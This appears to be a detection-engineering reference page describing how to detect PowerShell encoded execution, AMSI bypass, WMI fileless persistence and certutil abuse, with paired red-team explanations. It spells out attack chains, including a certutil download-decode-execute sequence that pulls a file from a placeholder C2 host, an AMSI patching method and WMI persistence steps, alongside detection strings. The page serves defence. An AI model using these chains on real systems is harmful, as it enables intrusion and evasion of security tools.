PowerShell Execution Engine
EXECUTION · COMMAND AND SCRIPTING INTERPRETER · INTENT-FIRST
▼
🔵 CORE BASELINE COMPOSITE
PowerShell Intent-First Composite — Encoded/Obfuscated Execution Anchor
📎 INSERT RULE LINK · KQL · Sentinel + MDE 🔗 MITRE T1059.001 📄 INSERT R&D PUBLICATION LINK
🔵 BLUE TEAM — Why this composite exists
PowerShell is the attacker's native tongue on Windows. The minimum truth anchor is intent-first: encoded or obfuscated parameters are structurally anomalous regardless of payload content. A legitimate administrator does not base64-encode routine management scripts.

The composite anchors on -EncodedCommand, -enc, -e flags combined with parent process context anomaly (Office apps, browsers, WMI, scheduled tasks spawning PowerShell).

Reinforcement signals: network connections immediately post-execution, AMSI bypass strings in Script Block Logs, download cradles (IEX, Invoke-Expression, Net.WebClient), execution from non-standard paths. Cumulative scoring prevents single-signal noise while ensuring the full chain is caught.
🔴 RED TEAM — How attackers deploy this
PowerShell is the attacker's entry point of choice because it is signed, trusted, provides direct .NET access, and is present on every modern Windows system. Kill chain position: Initial Access → Execution via phishing macro, or Post-Exploitation Execution following lateral movement.

Real-world attack chain:
Phishing email → malicious Office macro → powershell.exe -w hidden -enc [base64] → download cradle pulls stageless Cobalt Strike beacon from C2 → in-memory reflective injection via VirtualAlloc + WriteProcessMemory. No file ever touches disk.

Why encoding: (1) bypasses naive string-matching AV, (2) obscures C2 URLs from proxy log inspection, (3) evades email gateway content scanning.

AMSI Bypass Detection
T1562.001 · T1059.001
▼
📎 INSERT RULE LINK 🔗 T1562.001 Impair Defenses 🔗 AMSI Documentation
⚡ KILL CHAIN: Defense Evasion (prerequisite) → Execution
🔵 BLUE TEAM
AMSI passes script content to AV engines before execution. Bypassing it is a prerequisite for all sophisticated in-memory PowerShell attacks. Minimum truth: Script Block Logging capturing known bypass strings (AmsiUtils, amsiInitFailed, AmsiScanBuffer), PowerShell process writing to amsi.dll memory via reflection, or using System.Reflection.Assembly to patch the AMSI provider. This cousin catches the prerequisite — upstream of the actual malicious payload.
🔴 RED TEAM
Why bypass AMSI first: Without bypassing AMSI, Empire, Cobalt Strike PS payloads, and PowerSploit are immediately caught by Windows Defender even in-memory.

Standard reflection patch (3 lines): Uses .NET reflection to locate AmsiScanBuffer in amsi.dll memory and patches it to return AMSI_RESULT_CLEAN always. Executes in milliseconds before the actual payload. Tools like AMSITrigger help identify which strings trigger detection so they can be mutated.

Kill chain position: Always before payload — the unlocking step that enables all subsequent in-memory PowerShell execution.

T1047
WMI Fileless Execution Engine
EXECUTION · SUBSTRATE-FIRST DETECTION · NO COMMAND LINE VISIBLE
▼
🔵 CORE BASELINE COMPOSITE
WMI Provider Host Anomalous Child Process — Substrate-First Anchor
📎 INSERT RULE LINK · KQL · Sentinel + MDE 🔗 MITRE T1047
🔵 BLUE TEAM — Why substrate-first is essential here
WMI is the quintessential substrate-first detection challenge. No command line is visible — WmiPrvSE.exe spawns child processes that appear to have no parent relationship to the attacker's tool. The minimum truth anchor: WmiPrvSE.exe spawning any interactive process: cmd.exe, powershell.exe, cscript.exe, or any executable outside system32.

The 30-day Atomic Sentinel Layer is critical here — WMI subscription creation (FilterToConsumerBinding) may occur days before execution fires. The primitive index tracks the subscription event independently, defeating temporal deception. Reinforcement: network connections from WmiPrvSE, process injection into WmiPrvSE, WMI namespace modification events.
🔴 RED TEAM — Why WMI is a favourite
WMI is the attacker's fileless persistence and execution holy grail: signed Windows component, runs as SYSTEM, and historically generated almost no detectable telemetry in poorly configured SIEMs.

APT-grade attack chain:
1. Foothold established via phishing
2. Create WMI Event Filter (trigger: system uptime > 5 min)
3. Create WMI Event Consumer (action: execute PS download cradle)
4. Create FilterToConsumerBinding
5. On every reboot, 5 min post-startup, payload executes — no scheduled task, no run key, no file on disk.

Why it evades: WmiPrvSE parent process. Many SIEMs whitelist WmiPrvSE. The payload lives in the WMI repository — a binary database at C:\Windows\System32\wbem\Repository.

Certutil Remote Download / Decode Anchor — LOLBin Intent-First Composite
📎 INSERT RULE LINK · KQL · Sentinel + MDE 🔗 MITRE T1218 🔗 LOLBAS Project
🔵 BLUE TEAM
Certutil has no legitimate reason to download files from the internet or decode base64 in most enterprise environments. It is the canonical intent-first detection: the minimum truth is certutil executing with -urlcache, -decode, or -decodehex flags. The command implies capability regardless of payload.

Composite reinforcement: unusual parent process (Office, browser), output file written to TEMP/AppData/ProgramData, immediate execution of the decoded output file, network egress from certutil itself. The LOLBAS project documents all known LOLBin capabilities — the cousin rules cover each documented abuse path.
🔴 RED TEAM
Why certutil: Signed by Microsoft, whitelisted by nearly every application control policy, and capable of base64 decode and remote file download natively — no additional tools.

Classic download-decode-execute chain (no PowerShell):
certutil -urlcache -split -f http://[C2]/p.txt p.b64
certutil -decode p.b64 p.exe
p.exe → Cobalt Strike loader runs

Entire chain uses only Microsoft-signed binaries. No PowerShell, no scripts, no suspicious extensions.
